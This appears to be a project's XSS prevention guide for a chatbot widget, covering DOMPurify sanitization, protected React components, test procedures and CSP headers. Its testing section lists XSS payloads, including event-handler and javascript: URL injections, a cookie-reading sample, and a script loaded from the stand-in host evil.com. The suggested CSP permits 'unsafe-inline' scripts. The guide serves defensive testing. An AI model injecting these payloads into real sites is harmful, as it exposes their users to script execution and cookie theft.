# XSS Prevention Guide

## Overview

This document outlines the XSS (Cross-Site Scripting) prevention measures implemented across the application to protect against malicious script injection attacks.

## XSS Protection Implementation

### 1. Frontend Protection (Vanilla JavaScript)

#### Sanitization Utility (`public/sanitizer.js`)
- Uses **DOMPurify** library loaded from CDN
- Provides `window.chatSanitize()` function for HTML sanitization
- Provides `window.chatParseMarkdown()` function for safe markdown parsing
- Fallback to basic HTML escaping if DOMPurify fails to load

**Allowed HTML Tags:**
- Text formatting: `b`, `i`, `em`, `strong`, `code`, `pre`
- Structure: `p`, `div`, `span`, `br`, `ul`, `ol`, `li`
- Headings: `h1`, `h2`, `h3`, `h4`, `h5`, `h6`
- Links: `a` (with restricted attributes)

**Allowed Attributes:**
- `href`, `target`, `rel`, `class`, `style`
- No data attributes allowed
- Safe URL schemes only (http, https, mailto, tel, etc.)

#### Protected Files
1. **`public/agent.js`** - Chat widget implementation
   - Sanitizes: `buttonText`, `chatbotName`, `welcomeMessage`, `suggestions`, message content, system messages
   
2. **`public/agent-hybrid.js`** - Iframe-based chat widget
   - Sanitizes: `buttonText`
   - Additional protection through iframe isolation

### 2. React Component Protection

#### Sanitization Hook (`src/hooks/useSanitize.ts`)
- Custom React hook using DOMPurify
- Provides `sanitize()`, `sanitizeArray()`, and `sanitizeMarkdown()` functions
- Consistent sanitization rules across React components

#### Protected Components

**`src/pages/preview/ChatPreview.tsx`**
- Sanitizes all config properties before passing to ChatboxPreview:
  - `chatbotName`, `welcomeMessage`, `buttonText`
  - `suggestions` array
  - `emailPlaceholder`, `emailMessage`
  - `retentionMessage`

**`src/pages/chat/SearchAssistant.tsx`**
- Sanitizes config data on fetch:
  - `chatbotName`, `welcomeMessage`, `buttonText`
  - `suggestions` array
  - `emailPlaceholder`

**`src/components/settings/ChatboxPreview.tsx`**
- Receives pre-sanitized props from parent components
- Uses ReactMarkdown for message content (built-in XSS protection)

## Attack Vectors Protected

### 1. Stored XSS
✅ **Protected:** All agent configuration fields (chatbot name, welcome message, button text, suggestions) are sanitized before rendering.

**Example Attack Prevented:**
```javascript
// Malicious admin input
welcomeMessage: "<img src=x onerror='alert(document.cookie)'>"

// After sanitization
welcomeMessage: "&lt;img src=x onerror='alert(document.cookie)'&gt;"
```

### 2. Reflected XSS
✅ **Protected:** User messages and system messages are sanitized through markdown parser.

### 3. DOM-Based XSS
✅ **Protected:** All `innerHTML` assignments use sanitized content.

## Security Best Practices

### DO ✅
- Always use `window.chatSanitize()` before setting `innerHTML` in vanilla JS
- Always use `useSanitize()` hook in React components
- Sanitize data at the point of rendering, not storage
- Use `ReactMarkdown` or `StyledMarkdown` for user-generated content
- Test with known XSS payloads (see Testing section)

### DON'T ❌
- Never use `dangerouslySetInnerHTML` without sanitization
- Don't trust any data from external sources
- Don't use `eval()` or `Function()` constructor with user input
- Don't disable or bypass sanitization functions
- Don't assume backend validation is sufficient

## Testing XSS Protection

### Test Payloads

Use these payloads to verify XSS protection:

```javascript
const xssTestPayloads = [
  // Script injection
  "<script>alert('XSS')</script>",
  "<script src='http://evil.com/xss.js'></script>",
  
  // Event handlers
  "<img src=x onerror='alert(1)'>",
  "<svg onload=alert(1)>",
  "<body onload=alert(1)>",
  
  // JavaScript protocol
  "<a href='javascript:alert(1)'>Click</a>",
  "<iframe src='javascript:alert(1)'>",
  
  // Data URI
  "<object data='data:text/html,<script>alert(1)</script>'>",
  
  // HTML entities
  "&lt;script&gt;alert('XSS')&lt;/script&gt;",
  
  // Unicode/Encoded
  "\u003cscript\u003ealert('XSS')\u003c/script\u003e",
];
```

### Testing Procedure

1. **Agent Configuration Testing**
   ```
   1. Navigate to Agent Builder
   2. Enter XSS payload in chatbot name field
   3. Save agent configuration
   4. Open chat preview
   5. Verify payload is escaped/sanitized in UI
   ```

2. **Chat Message Testing**
   ```
   1. Open chat widget
   2. Send XSS payload as user message
   3. Verify message displays safely
   4. Check bot response handling
   ```

3. **Suggestions Testing**
   ```
   1. Add XSS payload to suggestions array
   2. Save and preview
   3. Click suggestion
   4. Verify safe execution
   ```

### Automated Testing

Add to your test suite:

```typescript
// Example test
import { useSanitize } from '@/hooks/useSanitize';

describe('XSS Prevention', () => {
  const { sanitize } = useSanitize();
  
  it('should sanitize script tags', () => {
    const dirty = "<script>alert('XSS')</script>";
    const clean = sanitize(dirty);
    expect(clean).not.toContain('<script>');
  });
  
  it('should sanitize event handlers', () => {
    const dirty = "<img src=x onerror='alert(1)'>";
    const clean = sanitize(dirty);
    expect(clean).not.toContain('onerror');
  });
});
```

## Content Security Policy (CSP)

### Recommended Headers

Add to your backend/CDN configuration:

```
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' wss://api-staging.7en.ai https://api-staging.7en.ai;
  font-src 'self' data:;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
```

### Iframe Isolation

The hybrid widget uses iframe isolation for additional security:
- Chat content runs in isolated iframe context
- Postmessage API for safe cross-origin communication
- No direct DOM access from parent window

## Incident Response

If XSS vulnerability is discovered:

1. **Immediate Actions**
   - Disable affected feature/component
   - Review server logs for exploitation attempts
   - Notify security team

2. **Investigation**
   - Identify attack vector
   - Determine scope of vulnerability
   - Check for similar issues in codebase

3. **Remediation**
   - Apply sanitization to affected code paths
   - Add regression tests
   - Deploy fix immediately

4. **Post-Incident**
   - Update security documentation
   - Conduct security review of related code
   - Add monitoring/alerts for similar patterns

## Maintenance

### Regular Tasks
- [ ] Review DOMPurify updates monthly
- [ ] Run XSS scanner tools quarterly
- [ ] Update allowed tags/attributes as needed
- [ ] Review new features for XSS risks
- [ ] Audit third-party library updates

### Security Checklist for New Features

Before deploying new features that render user content:

- [ ] All user inputs sanitized with DOMPurify
- [ ] No `innerHTML` without sanitization
- [ ] No `dangerouslySetInnerHTML` without review
- [ ] XSS test payloads tested
- [ ] Security team review completed
- [ ] Documentation updated

## References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Content Security Policy Reference](https://content-security-policy.com/)

## Contact

For security concerns or questions:
- Security Team: security@7en.ai
- Report vulnerabilities: security@7en.ai
